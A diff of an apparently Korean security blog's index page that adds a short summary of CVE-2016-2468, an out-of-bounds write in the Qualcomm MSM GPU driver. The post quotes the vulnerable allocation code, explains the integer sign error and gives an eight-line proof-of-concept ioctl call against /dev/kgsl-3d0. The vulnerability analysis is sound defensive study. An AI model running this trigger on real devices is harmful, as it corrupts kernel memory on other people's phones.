@@ -9,8 +9,8 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Earlence Fernandes, et al. 의 아티클을 읽어보았다.
-">
+  <meta name="description" content="Disclosure of CVE-2016-2468, OOB write in Qualcomm MSM GPU driver size 의 하위 32 bit 가 0x80000000 보다 크면, len 이 음수가 된다.
+그러면 루프에 들어가지 않고, 바로 sg_mark_end &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +66,104 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-06-13T13:31:59+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>1:31 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://retme.net/index.php/2016/06/12/CVE-2016-2468.html">Disclosure of CVE-2016-2468, OOB write in Qualcomm MSM GPU driver</a></p>
+
+<ul>
+<li><code>size</code> 의 하위 32 bit 가 0x80000000 보다 크면, <code>len</code> 이 음수가 된다.</li>
+<li>그러면 루프에 들어가지 않고, 바로 <code>sg_mark_end()</code> 가 불린다.</li>
+<li>그러면 <code>sglen</code> 이 0 인 상황에 변함이 없으므로, <code>sg_mark_end(&amp;memdesc-&gt;sg[-1]);</code> 이 된다.</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>static int
+</span><span class='line'>_kgsl_sharedmem_page_alloc(struct kgsl_memdesc *memdesc,
+</span><span class='line'>  struct kgsl_pagetable *pagetable,
+</span><span class='line'>  size_t size)
+</span><span class='line'>{
+</span><span class='line'>  int ret = 0;
+</span><span class='line'>  int len, page_size, sglen_alloc, sglen = 0;
+</span><span class='line'>  unsigned int align;
+</span><span class='line'>
+</span><span class='line'>  //...snip...
+</span><span class='line'>
+</span><span class='line'>  len = size;
+</span><span class='line'>  while (len &gt; 0) {
+</span><span class='line'>      //...snip...
+</span><span class='line'>  }
+</span><span class='line'>  memdesc-&gt;sglen = sglen;
+</span><span class='line'>  memdesc-&gt;size = size;
+</span><span class='line'>  sg_mark_end(&memdesc-&gt;sg[sglen-1]);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>PoC 는,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void kgsl_poc() {
+</span><span class='line'>  int fd = open("/dev/kgsl-3d0",0);
+</span><span class='line'>  struct kgsl_gpumem_alloc_id arg;
+</span><span class='line'>  
+</span><span class='line'>  arg.flags = 0;
+</span><span class='line'>  arg.size = 0xa18fb010b0c08000;
+</span><span class='line'>  ioctl(fd,IOCTL_KGSL_GPUMEM_ALLOC_ID,&arg);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>사이즈가 다른 변수간에 형변환하다가, neg 가 되버리는 이슈.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -960,35 +1058,6 @@ OpenSSL 버그때문에, 서버 설정에 상관없이, 강제로 SSLv2 로 네�
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2016/02/11/racing-midi-messages-in-chrome/">Racing MIDI Messages in Chrome</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2016-02-11T17:36:37+09:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>5:36 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>PZ 블로그에 새로 올라온 글, <a href="http://googleprojectzero.blogspot.kr/2016/02/racing-midi-messages-in-chrome.html">Racing MIDI messages in Chrome</a>를 읽었다. 정리해본다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/2">&larr; Older</a>
@@ -1004,6 +1073,10 @@ OpenSSL 버그때문에, 서버 설정에 상관없이, 강제로 SSLv2 로 네�
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
       </li>
     
@@ -1017,10 +1090,6 @@ OpenSSL 버그때문에, 서버 설정에 상관없이, 강제로 SSLv2 로 네�
     
       <li class="post">
         <a href="/blog/2016/03/03/the-drown-attack/">The DROWN Attack</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/25/mnist-for-ml-beginners/">MNIST for ML Beginners</a>
       </li>
     
   </ul>
